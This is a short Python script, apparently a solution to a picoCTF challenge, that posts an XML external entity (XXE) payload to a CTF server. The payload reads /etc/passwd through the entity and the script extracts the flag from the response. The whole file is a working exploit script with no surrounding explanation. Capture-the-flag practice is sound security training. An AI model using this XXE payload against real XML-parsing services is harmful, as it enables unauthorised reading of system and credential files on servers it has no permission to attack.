import requests
import re

url  = "http://saturn.picoctf.net:64554"

payload = """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
""".strip()

res = requests.post(f'{url}/data', headers={ 'Content-Type': 'application/xml' }, data=payload)

print(re.findall(r'(picoCTF{.+})', res.text)[0])